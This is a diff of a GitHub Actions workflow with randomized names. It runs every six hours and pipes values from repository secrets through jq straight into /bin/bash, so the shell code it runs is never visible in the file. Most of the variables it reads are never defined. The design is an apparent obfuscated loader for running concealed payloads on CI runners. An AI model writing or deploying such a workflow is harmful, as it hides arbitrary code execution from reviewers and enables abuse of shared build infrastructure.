@@ -1,23 +1,31 @@
 name: anzaidong1887
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 2/6 * * *'
+    - cron: '16 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: anzaidong1887
         env:
-          ut26919: ${{ secrets.ut26919 }}
+          qfkkk120: ${{ secrets.qfkkk120 }}
         run: |
-          echo $ut26919 | jq -r .ia39 | /bin/bash
-          echo $hyom628 | jq -r .zbtc8233 | /bin/bash
-          echo $ik7 | jq -r .sp7026 | /bin/bash
-          echo $yqqbl1586 | jq -r .mspu8 | /bin/bash
-          echo $uqy44969 | jq -r .hirrg704 | /bin/bash
-          echo $ikny0011 | jq -r .nwhut58 | /bin/bash
-          echo $a38 | jq -r .c95 | /bin/bash
+          echo $qfkkk120 | jq -r .kuhpc03 | /bin/bash
+          echo $gm5359 | jq -r .y72207 | /bin/bash
+          echo $knssk6 | jq -r .vsn55867 | /bin/bash
+          echo $r2871 | jq -r .uskc4573 | /bin/bash
+          echo $afo03 | jq -r .uvkvz12 | /bin/bash
+          echo $yjsp61436 | jq -r .y0330 | /bin/bash
+          echo $m13023 | jq -r .jn75876 | /bin/bash
+          echo $uyc62236 | jq -r .bo659 | /bin/bash
+          echo $ql729 | jq -r .lp6 | /bin/bash
+          echo $p328 | jq -r .xgauh67686 | /bin/bash
+          echo $gjqwn643 | jq -r .zt4174 | /bin/bash
+          echo $yt05 | jq -r .ndolu53036 | /bin/bash
+          echo $np2573 | jq -r .omips01 | /bin/bash
+          echo $y33 | jq -r .ya58 | /bin/bash
 
